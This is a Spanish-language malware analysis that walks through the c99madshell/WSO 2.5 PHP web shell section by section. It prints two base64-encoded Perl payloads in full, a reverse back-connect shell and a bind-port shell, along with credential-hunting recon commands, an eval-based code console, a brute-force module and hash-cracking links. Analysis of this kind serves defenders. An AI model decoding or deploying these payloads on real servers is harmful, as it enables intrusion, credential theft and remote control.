# **c99madshell 2.5**

1. Color #df5
1. Accion por default : `'FilesMan'`
1. Usa Ajax
1. Charsest por default `'Windows-1251'`
1. si *argc* es 3 
    * asigna _POST el argv 1 decodificando base64
    * asigna _SERVER el argv 2 decodificando base64
1. Verifica que el encabezado User-Agent no esté vacio

    > User-Agent es el encabezado que contiene un string característico que permite al protocolo de red identificar el tipo de aplicación, sistema operativo, versión de software o proveedor del agente usuario de software solicitando
    
    En caso de que no esté vacío comprueba que estén incluidos los siguientes:
    * Google
    * Slurp
    * MSNBot
    * ia_archiver
    * Yandex
    * Rambler
1. Inicializa la variable de configuración de logs de error en `NULL`, el límite de ejecución en 0
1. Ejecuta la función *set_magic_quotes_runtime* que es obsoleta
1. Define una constante llamada WSO_VERSION en 2.5
    > La variable de configuración `magic_quotes` funciona para escapar las comillas dobles y simples desde *GET* - *POST* o *Cookies*
1. Verifica que la función de comillas mágicas esté activada    
    >**Para php >5.4 esta funcion es obsoleta**

    * Define una función que realiza una llamada recursiva a un arreglo para quitarle las diagonales invertidas de un `string` con comillas escapadas

    * Aplica esa función para los parametros *POST* o *Cookies*
1. Define una función llamada **`wsoLogin`** que envía un llamado a la función `die` con un formulario con contraseña
1. Define una función llamada **`WSOsetcookie`** que pide 2 parámetros declarar una cookie, que son la llave y el valor de la cookie

1. Verifica que exista y no esté vacía la variable `$auth_pass`, en caso de que exista comprueba que sea la misma al parametro **post** llamado 'pass' y mediante el llamado de la funcion **`WSOsetcookie`** la ingresa al arreglo de cookies con el nombre *HTTP_HOST* en md5. Posteriormente vuelve a verificar que la cookie exista y que la contraseña coincida, de lo contrario llama a la función **`wsoLogin`**

1. Realiza un substring a la variable `PHP_OS` para comprobar que el sistema operativo sea windows u otro y lo asigna a la variable
1. Asigna la variable `$safe_mode` con el valor de la directiva 'safe_mode'
    >**Para php >5.3 esta funcion es obsoleta**
1. Asigna la variable `$disable_functions` con el valor de la directiva 'disable_functions'
    > La directiva disable_functions puede utilizarse para deshabilitar ciertas funciones de sistema por seguridad.
1. Asigna la variable `$home_cwd` con el valor de la funcion 'getcwd'
    > El directorio raiz de donde se ejecute el programa php
1. Verifica que el parametro **post** llamado 'c' exista y en caso de que sí, realiza la llamada a la funcion 'chdir'
1. Asigna la variable `$cwd` con el valor de la funcion 'getcwd' que pudo haber cambiado con la llamada anterior
    > Cambia el directorio actual al especificado.
1. En caso de que el sistema operativo sea **Windows** reemplaza la doble diagonal invertida por una diagonal normal de las variables `$cwd` y `$home_cwd`
1. Verifica que el último caracter de la variable `$cwd` sea una diagonal y en caso de que no lo sea, se la agrega
1. Verifica que exista en el arreglo de cookies una con el nombre *HTTP_HOST* en md5 concatenado ajax, en caso de que no, la agrega con el contenido de la variable `$default_use_ajax`
1. Verifica el sistema operativo e inicializa un arreglo `$aliases` con una lista de los comandos para acceder a servicios y directorios del sistema operativo:
    
    Clave de arreglo | Sistema Operativo | Comando
    ---------------- | ----------------- | -------
    List Directory | Windows | `dir`
    Find index.php in current dir | Windows | `dir /s /w /b index.php`
    Find \*config*.php un current dir | Windows | `dir /s /w /b \*config*.php`
    Show active connections | Windows | `netstat -an`
    Show running services | Windows | `net start`
    User accounts | Windows | `net user`
    Show computers | Windows | `net view`
    ARP Table | Windows | `arp -a`
    IP Configuration | Windows | `ipconfig /all`
    ---------------- | ----------------- | -----------
    List dir | Other | `ls -lha`
    list file attributes on a Linux second extended file system | Other | `lsattr -va`
    show opened ports | Other | `netstat -an \| grep -i listen`
    process status | Other | `ps aux`
    ---------------- | ----------------- | -------
    Find | Other | 
    find all suid files | Other | `find / -type f -perm -04000 -ls`
    find suid files in current dir | Other | `find . -type f -perm -04000 -ls`
    find all sgid files | Other | `find / -type f -perm -0200 -ls`
    find sgid files in current dir | Other | `find . -type f -0200 -ls`
    find config.inc.php files | Other | `find / -type f -name config.inic.php`
    find config* files | Other | `find / -type f -name \\"config*\\""`
    find config* files in current dir | Other | `find . -type f -name \\"config*\\"`
    find all writable folders and files | Other | `find / -perm -2 -ls`
    find all writable folders and files in current dir | Other | `find . -perm -2 -ls`
    find all service.pwd files | Other | `find / -type f -name service.pwd`
    find service.pwd files in current dir | Other | `find . -type f -name service.pwd`
    find all .htpasswd files | Other | `find / -type f -name .htpasswd`
    find -htpasswd files in current dir | Other | `find . -type f -name .htpasswd`
    find all .bash_history files | Other | `find / -type f -name .bash_history`
    find .bash_history files in current dir | Other | `find . -type f -name .bash_history`
    find all .fetchmailrc files | Other | `find / -type f -name .fetchmailrc`
    find .fetchmailrc files in current dir | Other | `find . -type f -name .fetchmailrc`
    ---------------- | ----------------- | -------
    Locate | Other | 
    locate httpd.conf files | Other | `locate httpd.conf`
    locate vhosts.conf files | Other | `locate vhosts.conf`
    locate proftpd. conf files | Other | `locate proftpd.conf`
    locate psybnc.conf files | Other | `locate psybnc.conf`
    locate my.conf files | Other | `locate my.conf`
    locate admin.php files | Other | `locate admin.php`
    locate cfg.php files | Other | `locate cfg.php`
    locate conf.php files | Other | `locate conf.php`
    locate config.dat files | Other | `locate config.dat`
    locate config.php files | Other | `locate config.php`
    locate config.inc files | Other | `locate config.inc`
    locate config.inc.php files | Other | `locate config.inc.php`
    locate config.default.php files | Other | `locate config.default.php`
    locate config files | Other | `locate config`
    locate .conf files | Other | `locate '.conf'`
    locate .pwd files | Other | `locate '.pwd'`
    locate .sql files | Other | `locate '.sql'`
    locate .htpasswd files | Other | `locate '.htpasswd'`
    locate .bash_history files | Other | `locate '.bash_history'`
    locate .mysql_history files | Other | `locate '.mysql_history'`
    locate .fetchmailrc files | Other | `locate '.fetchmailrc'`
    locate backup files | Other | `locate backup`
    locate dump files | Other | `locate dump`
    locate priv files | Other | `locate priv`

1. Define la funcion **`wsoHeader`** que verifica que exista el parametro **post** llamado 'charset', en caso de que no exista le asigna el valor de la variable global default_charset definida al principio
1. Comiena a imprimir el documento **`HTML`** asignando el charset y como titulo el contenido de HTTP_HOST concatenando " - WSO " y la versión de WSO, posteriormente la definición de la hoja de estilos y un script **JavaScript** mayormente obfuscado:

    1. Define una variable `c_` con el contenido de la variable global `$cwd` antes escapando los caracteres especiales html
    1. Define una variable `a_` con el contenido del parametro **post** llamado 'a' antes escapando los caracteres especiales html
    1. Define una variable `charset_` con el contenido del parametro **post** llamado 'charset' antes escapando los caracteres especiales html
    1. Verifica que el contenido del parametro **post** llamado 'p1' contenga un salto de línea, en caso positivo asigna el vacío a una variable llamada `p1_`, en caso contrario asigna el valor del parámetro en la variable anterior escapando los caracteres especiales html
    1. Verifica que el contenido del parametro **post** llamado 'p2' contenga un salto de línea, en caso positivo asigna el vacío a una variable llamada `p2_`, en caso contrario asigna el valor del parámetro en la variable anterior escapando los caracteres especiales html, incluyendo las comillas dobles
    1. Verifica que el contenido del parametro **post** llamado 'p3' contenga un salto de línea, en caso positivo asigna el vacío a una variable llamada `p3_`, en caso contrario asigna el valor del parámetro en la variable anterior escapando los caracteres especiales html, incluyendo las comillas dobles
    1. Defina una variable `d` con el DOM **document**
    1. Define una función llamada **set** que solicita como atributos a,c,p1,p2,p3 y charset *igual a las variables asignadas arriba*, y mientras no sean nulos, los setea en los inputs del formularo **mf**, en caso de que sean nulos asigna los valores que se definieron de forma inicial.
    1. Define una función llamada **g** que solicita como atributos a,c,p1,p2,p3 y charset *igual a las variables asignadas arriba*, llama a la funcion **set** y realiza el submit del formulario **mf**
    1. Define una función llamada **a** que solicita como atributos a,c,p1,p2,p3 y charset *igual a las variables asignadas arriba*, llama a la función **set** y después define una variable llamada **params** con el valor `"ajax=true"`, finalmente cicla los elementos del formulario **mf** y los concatena a la variable **params** como *query-string* y llama a la función **sr** con la variable `$_SERVER[REQUEST_URI]` con las diagonales escapadas como primer parámetro y la variable **params** como segundo parámetro
    > Request URI es la URI que se utilizó para acceder a la página

    1. Define una función llamada **sr** que solicita como atributos una url y parámetros los cuales envía mediante una llamada **_AJAX_** asignando como callback la función **processReqChange**
    1. Define una función llamada **processReqChange** que verifica que el estado de la solicitud esté en 4 y que el status sea 200, después ejecuta una expresión regular al resultado y evalua el substring del resultado **no entendi bien que hace aqui :c

    Continua imprimiendo **`HTML`** con el formulario **mf** e *inputs hidden* con los nombres a,c,p1,p2,p3 y charset.
1. Asigna la variable `$freeSpace` con el valor de la funcion 'diskfreespace' con el parametro de la variable global `$cwd`
    > `diskfreespace` o `disk_free_space` devuelve el número de **bytes** disponibles en el sistema de archivos o partición
1. Asigna la variable `$totalSpace` con el valor de la funcion 'disk_total_space' con el parametro de la variable global `$cwd`
    > `disk_total_space` devuelve el número de **bytes** totales en el sistema de archivos o partición

    Comprueba que `$totalSpace` sea distinto a 0, de lo contrario asigna 1
1. Asigna la variable `$release` con el valor de la funcion 'php_uname' con el parametro "r"
    > Devuelve el nombre de la versión liberada del sistema operativo
1. Asigna la variable `$kernel` con el valor de la funcion 'php_uname' con el parametro "s"
    > Devuelve el nombre del sistema operativo
1. Declara una variable llamada `$explink` con una url que realiza una búsqueda en **_exploit-db_** concatenando el sistema operativo y su versión en las 2 variables anteriores.
1. Comprueba que la función `posix_getegid` exista
    
    En caso de que no exista, declara la variable `$group` con el valor "?", y las variables `$user`,`$uid`,`$gid` con las funciones **get_current_user**,**getmyuid** y **getmygid** respectivamente.
    En caso de que exista utiliza las siguientes funciones para asignar las variables anteriores

    * Para `$uid` utiliza **posix_getpwuid** pasando como parámetro el resultado de **posix_geteuid**
    > TODO: documentar las funciones posix de uid

    * Para `$gid` utiliza **posix_getgrgid** pasando como parámetro el resultado de **posix_getegid**
    > TODO: documentar las funciones posix de gid
    
    * para `$user` busca la llave _name_ en `$uid` y reestablece `$uid` con una llamada a su llave _uid_

    * para `$group` busca la llave _name_ en `$gid` y reestablece `$gid` con una llamada a su llave _gid_
1. Declara una variable llamada `$cwd_links` como string vacío
1. Declara una variable llamada `$path` como un arreglo de los elementos de la variable global `$cwd` separados por diagonales
1. Asigna la variable `$n` el número de elementos de la variable `$path`
1. Cicla los elemenots de `$path` para generar los links dentro de `$cwd_links` hacia la función **g** de Javascript pasando como parametro **`FilesMan`**
1. Declara una variable llamada `$charsets` como un array que contiene los siguientes strings: "UTF-8", "Windows-1251", "KOI8-R", "KOI8-U", "cp866"
1. Declara una variable llamada `$opt_charsets` y options HTML ciclando los elementos de `$charsets` 
1. Declara una variable llamada `$m` con los valores del menú y las funciones:
    
    1. Sec. Info: **`SecInfo`** 
    1. Files: **`FilesMan`** 
    1. Console: **`Console`** 
    1. SQL: **`Sql`** 
    1. Php: **`Php`** 
    1. String tools: **`StringTools`** 
    1. BruteForce: **`Bruteforce`** 
    1. Network: **`Network`** 
    1. Logout: **`Logout`** en caso de que no esté vacía la variable global `$auth_pass`
    1. Self Remove: **`SelfRemove`** 
1. Declara una variable llamada `$menu` con que genera links de tipo *onClick* hacia la función de javascript **g** ciclando el arreglo `$m` 
1. Declara una variable llamada `$drives` con que genera links de tipo *onClick* hacia la función de javascript **g** ciclando las letras del alfabeto desde la c a la z que sean **directorios** 
1. Imprime una tabla **`HTML`** con los siguientes parámetros:
    
    * Los primeros 120 caracteres de la función `php_uname`
    > Da información general del sistema operativo

    * El link de la variable `$explink` hacia exploit-dbcom
    * El *uid*, nombre de usuario, *gid* y nombre de grupo
    * La versión de php
    * Si php se está ejecutando en *safe_mode*
    * Un link **`HTML`** que llama a la función `g` de Javascript con el parametro 'PHP' como a, null en b y 'info' en p2
    * La fecha
    * Una llamada a la función **`wsoViewSize`** pasando de parametro la variable global `$totalSpace`,
    * El calculo del porcentaje disponible en disco 
    * Concatena la variable global `$cwd_links` con una llamada ala función wsoPermsColor, con la variable global `$cwd` como parámetro
    * Un link **`HTML`** que llama a la función `g` de Javascript con el parametro 'FilesMan' como a, '$GLOBAL[home_cwd]' en b y '' en los otros parámetros
    * El contenido de la variable `$drives`
    * Un select **`HTML`** con los charsets
    * La IP del servidor
    * La IP del cliente
    * El contenido de la variable `$menu`
    > El menu con las opciones
1. Define la función **`wsoFooter`**, que verifica que el directorio de la aplicación sea editable. Posteriormente imprime una tabla **`HTML`** que contiene funcionalidades de administración de archivos como son crear nuevo archivo o directorio, subir un nuevo archivo, etc.
1. Verifica que existan las funciones posix y en caso de que no, las define con retornos falsos para que no existan errores de interpretación.
1. Define la función **`wsoEx`** solicita de parámetro un comando y revisa que existan las funciones siguientes para intentar ejecutarlo:
    * exec
    * passthru
    * system
    * shell_exec

    En caso de que ninguna de las funciones anteriores exista, utiliza la función `popen` para ejecutar el comando.
    > `popen` genera un pipe hacia un proceso sobre un archivo.

    Finalmente regresa el resultado.
1. Define la función **`wsoViewSize`** con un parámetro (aparentemente número de bytes) que funciona para mostrar el parámetro de entrada en *KB*, *MB* o *GB*
1. Define la función **`wsoPerms`** y **`wsoPermsColor`** que muestra y colorea los permisos de un archivo o directorio
1. Define la función **`wsoScandir`** que solicita un parámetro (aparentemente la ruta a un directorio) y verifica que exista a función `scandir`, en caso de que no exista, cicla manualmente los archivos y directorios del parámetro
    > `scandir` muestra los archivos y directorios dentro de un directorio
1. Define la función **`wsoWhich`** que solicita un parámetro (aparentemente el nombre del programa), con el cual llama a la función **`wsoEx`** dentro del comando **which**. Verifica que el resultado no esté vacío antes de enviarlo 
    > **which** funciona para obtener la ubicacion de un programa

## **`actionSecInfo`**

1. Llama a la función **`wsoHeader`**
1. Imprime como encabezado "Información de seguridad del servidor"
1. Define la función **`wsoSecParam`** solicita dos parámetros y les aplica formato **`HTML`** en la siguiente información (si existe)
    
     Clave | Función | Descripcion
     ----- | ------  | ----
     Server software | `getenv('SERVER_SOFTWARE')` | Tipo de servidor de aplicacion?
     Load Apache Modules | `apache_get_modules()` | Obtiene una lista de los modulos cargados del servidor Apache
     Disabled PHP Functions | `$GLOBALS['disable_functions']` | Funciones desabilitadas por seguridad 
     Open base dir | `ini_get('open_basedir')` | Limite de los archivos a los que puede acceder PHP
     Safe mode exec dir | `ini_get('safe_mode_exec_dir')` | En caso de que php esté corriendo en "safe_mode", la función `system` no ejecuta programas fuera del directorio
     Safe mode include dir | `ini_get('safe_mode_include_dir')` | En caso de que php esté corriendo en "safe_mode", la función `system` no toma en cuenta archivos fuera del directorio
     cURL support | `function_exists('curl_version')` | **Curl** es una herramienta para transferir datos en sintaxis URL desde consola
     Supported databases | `function_exists()` | verifica que existan funciones de bases de datos como son mysql, mssql, postgresql u oracle 
     ----| ---- | --- 
     Readable /etc/passwd | `is_readable` | Contiene la información del usuario en **Linux**
     Readable /etc/shadow | `is_readable` | Contiene las contraseñas cifradas de los usuarios en **Linux**
     OS version | `file_get_contents('/proc/version')` | El archivo contiene la versión del Kernel, el usuario, el compilador, etc. en **Linux**
     Distr name | `file_get_contents('/etc/issue.net')` | Para los sistemas basados en **Debian**, contiene la versión de la distribución.
     Userful | `implode(wsoWhich([]))` | Busca los programas siguientes en el sistema: gcc, lcc, cc, ld ,make, php, perl, pytohn, ruby, tar, gzip, bzip, bzip2, nc, locate, suidperl
     Danger | `implode(wsoWhich([]))` | Busca los programas siguientes en el sistema: kav, nod32, dcored, uvscan, sva, drwebd, clamd, rkhunter, chkrootkit, iptables, ipfw, tripwire, shieldcc, portsentry, snort, ossec, lidsadm, tcplodg, sxid, logcheck, logwatch, sysmask, zmbscap, sawmill ,wormscan, ninja
     Downloaders | `implode(wsoWhich([]))` | Busca los programas siguientes en el sistema: wget, tech, lynx, links, curl, get, lwp-mirror
     HDD space | `df -h` | Muestra la cantidad de espacil libre en los diferentes dispositivos
     Hosts | `file_get_contents('/etc/hosts')` | El archivo contiene información del nombres de host
     Users | Cicla todos los usuarios que puedan leerse.
     OS version | `ver` | Version de Sistema Operativo **Windows**
     Account Settings | `net accounts` | Muestra las configuraciones actuales, los requerimientos de password y el rol de un servidor **Windows**
     User Accounts | `net user` | Muestra el usuario actual en red para un sistema **Windows**

1. Ejecuta la función **`wsoFooter`**

## **`actionPhp`**
1. Comprueba si esta o no ocupando AJAX y genera la Cookie
1. Ejecuta la función **`wsoHeader`**
1. Muestra un editor de texto que ejecuta las funciones de código php.
> Utiliza la función *eval*, limpia los buffers y caracteres especiales antes de ejecutarla.
1. Ejecuta la función **`wsoFooter`**

## **`actionFilesMan`**
1. Verifica que la *Cookie* llamada **f** exista y la deserializa
1. Verifica que el parámetro **post** llamado 'p1' exista y lo evalúa en un Switch:
    1. uploadFile
    1. mkdir
    1. delete
    1. paste
        1. move-paste
        1. copy-paste
        1. zip
        1. unzip   
        1. tar
1. Ejecuta la función **`wsoHeader`**
1. Muestra un editor con la información de los archivos y genera un menú que permite ejecutar las funciones arriba mencionadas
1. Ejecuta la función **`wsoFooter`**

## **`actionStringTools`**

1. Ejecuta la función **`wsoHeader`**
Contiene la funcionalidad para ejecutar funciones de conversión *string*:

Nombre Función | Función en PHP
----- | -----
Base64 encode | `base64_encode`
Base64 decode | `base64_decode`
Url encode | `urlencode`
Url decode | `urldecode`
Full urlencode | `full_urlencode`
md5 hash | `md5`
sha1 hash | `sha1`
crypt | `crypt`
CRC32 | `crc32`
ASCII to HEX | `ascii2hex`
HEX to ASCII | `hex2ascii`
HEX to DEC | `hexdec`
HEX to BIN | `hex2bin`
DEC to HEX | `dechex`
DEC to BIN | `decbin`
BIN to HEX | `binhex`
BIN to DEC | `bindec`
String to lower case | `strtolower`
String to upper case | `strtoupper`
Htmlspecialhars | `htmlspecialchars`
String length | `strlen`

1. Declara la función RecursiveGlob para hacer búsquedas, también llama a los links siguientes de crack:
    1. [hashcracking.ru](https:hashcracking.ru/index.php)
    1. [md5.rednoize](http://md5rednoize.com)
    1. [crackfor.me](http://crackfor.me/index.php)
1. Ejecuta la función **`wsoFooter`**

## **`actionFileTools`**

1. Ejecuta la función **`wsoHeader`**
1. Muestra un editor de archivos que permite realizar las siguientes acciones:
    1. Visualizar
    1. Destacar
    1. Modificar permisos
    1. Editar
    1. *hexdump*
    1. Renombrar
    1. *touch*
1. Ejecuta la función **`wsoFooter`**


## **`actionConsole`**
1. Ejecuta la función **`wsoHeader`**
1. Muestra un editor de texto que permite ejecutar líneas de comando con la función **`wsoEx`**
    Genera una nueva función JavaScript que verifica el KeyDown para enviar los comandos por separado
1. Ejecuta la función **`wsoFooter`**

## **`actionSelfRemove`**
1. Ejecuta la función **`wsoHeader`**
1. Solicita una confirmación y ejecuta la función *unlink* sobre **_FILE_** para eliminar el archivo
1. Ejecuta la función **`wsoFooter`**

## **`actionBruteForce`**
1. Ejecuta la función **`wsoHeader`**
1. Ejecuta funciones de intentos de login Fuerza bruta de los siguientes tipos:
    1. etc/passwd : reverse (login -> nigol)
    1. dictionary
    
    Y lo ejecuta sobre los siguientes servicios:
    1. Mysql
    1. Postgresql
    1. FTP
1. Ejecuta la función **`wsoFooter`**

## **`actionSQL`**
1. Define una clase llamada DbClass que contiene las siguientes funciones sobre base de datos:
    1. connect
    1. select db
    1. query
    1. fetch 
    1. list db
    1. list tables
    1. throw error
    1. set charset
    1. laod file
    1. dump

1. Ejecuta la función **`wsoHeader`**
1. Muestra un editor que puede llamar a las funciones anteriormente definidas
1. Ejecuta la función **`wsoFooter`**

## **`actionNetwork`**
1. define 2 variables *back_connect_p* y *bind_port_p* con los siguientes caracteres:
    > **`$back_connect_p`**= "IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZ
GllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsN
CiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3R
vKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGV
uKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNC
nN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
 
    > **`$bind_port_p`** = "IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDE
pOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZ
GllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFM
sc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBk
aWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQ
oJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj
4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGV
jdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
1. Ejecuta la función **`wsoHeader`**
1. Realiza las siguientes funciones ejecutando el código de las variables arriba definidas:
    1. Bind port to /bin/sh [perl]
    1. Back-connect [perl]
1. Ejecuta la función **`wsoFooter`**
